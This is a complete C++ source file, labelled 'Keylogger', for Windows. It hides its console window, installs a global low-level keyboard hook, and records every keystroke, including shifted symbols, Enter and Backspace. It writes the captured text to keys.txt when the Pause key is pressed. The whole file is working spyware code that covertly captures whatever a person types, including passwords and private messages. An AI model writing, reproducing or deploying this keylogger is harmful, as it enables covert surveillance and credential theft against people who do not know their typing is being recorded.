/*
	Code by Luke Honeyball
	5/10/2024
	Keylogger

*/

#include <iostream>
#include <windows.h>
#include <fstream>
//imports
HHOOK hook;
std::string path = "keys.txt";
std::ofstream File(path);
bool _shiftdown = false;
bool _capsdown = false;


std::string keys = "";
void keyCompareDown_(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
		KBDLLHOOKSTRUCT* pKeyStruct = (KBDLLHOOKSTRUCT*)lParam;
		if (pKeyStruct->vkCode == VK_SHIFT || pKeyStruct->vkCode == VK_RSHIFT || pKeyStruct->vkCode == VK_LSHIFT) { _shiftdown = true; }
		char specials_[10] = { ')','!','@','#','$','%','^','&','*','(' };
		for (int specialsc_ = 0; specialsc_ < 10; specialsc_++) {
			if (_shiftdown && pKeyStruct->vkCode == 48 + specialsc_) {
				keys = keys + specials_[specialsc_];
			}
		}

		if (pKeyStruct->vkCode == VK_OEM_1) {
			if (_shiftdown) {
				keys = keys + ':';
			}
			else {
				keys = keys + ';';
			}
		}
		else if (pKeyStruct->vkCode == VK_OEM_2) {
			if (_shiftdown) {
				keys = keys + '?';
			}
			else {
				keys = keys + '/';
			}
		}
		else if (pKeyStruct->vkCode == VK_OEM_3) {
			if (_shiftdown) {
				keys = keys + '~';
			}
			else {
				keys = keys + '`';
			}
		}
		else if (pKeyStruct->vkCode == VK_OEM_4) {
			if (_shiftdown) {
				keys = keys + '{';
			}
			else {
				keys = keys + '[';
			}
		}
		else if (pKeyStruct->vkCode == VK_OEM_5) {
			if (_shiftdown) {
				keys = keys + '|';
			}
			else {
				keys = keys + '\\';
			}
		}

		else if (pKeyStruct->vkCode == VK_OEM_6) {
			if (_shiftdown) {
				keys = keys + '}';
			}
			else {
				keys = keys + ']';
			}
		}
		else if (pKeyStruct->vkCode == VK_OEM_7) {
			if (_shiftdown) {
				keys = keys + '\"';
			}
			else {
				keys = keys + '\'';
			}
		}
		else if (pKeyStruct->vkCode == VK_OEM_COMMA) {
			if (_shiftdown) {
				keys = keys + '<';
			}
			else {
				keys = keys + ',';
			}
		}
		else if (pKeyStruct->vkCode == VK_OEM_PERIOD) {
			if (_shiftdown) {
				keys = keys + '>';
			}
			else {
				keys = keys + '.';
			}
		}
		else if (pKeyStruct->vkCode == VK_OEM_MINUS) {
			if (_shiftdown) {
				keys = keys + '_';
			}
			else {
				keys = keys + '-';
			}
		}
		else if (pKeyStruct->vkCode == VK_OEM_PLUS) {
			if (_shiftdown) {
				keys = keys + '+';
			}
			else {
				keys = keys + '=';
			}
		}



		else if (pKeyStruct->vkCode == VK_BACK)
		{
			keys = keys + " |BACKSPACE| ";
			Sleep(100);
		}
		else if (pKeyStruct->vkCode == VK_PAUSE) {

			File << keys;
			File.close();

			UnhookWindowsHookEx(hook);
			exit(0);
		}
		else if (pKeyStruct->vkCode == VK_CAPITAL) {
			_capsdown = true;
		}
		else if (pKeyStruct->vkCode == VK_RETURN) {
			keys = keys + " |ENTER| ";
		}
		else if (_shiftdown == false) {
			for (int x = 7; x < 128; x++) {

				if (pKeyStruct->vkCode == x) {
					keys = keys + (char)pKeyStruct->vkCode;
					Sleep(100);
				}

			}
		}
	}
}
//all key comparing



LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0 && (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)) {
		KBDLLHOOKSTRUCT* pKeyStruct = (KBDLLHOOKSTRUCT*)lParam;
		if (pKeyStruct->vkCode == VK_SHIFT || pKeyStruct->vkCode == VK_RSHIFT || pKeyStruct->vkCode == VK_LSHIFT) { _shiftdown = false; }
		if (pKeyStruct->vkCode == VK_CAPITAL) { _capsdown = false; }
	}
	keyCompareDown_(nCode,wParam,lParam);
	return CallNextHookEx(hook, nCode, wParam, lParam);
}
//hook process

int main() {
	FreeConsole();
	hook = SetWindowsHookEx(WH_KEYBOARD_LL,KeyboardProc,NULL,0);
	MSG m;
	while (1) {

		GetMessage(&m,NULL,0,0);
		TranslateMessage(&m);
		DispatchMessage(&m); 
		//loop
	}
	
	return 0;
}


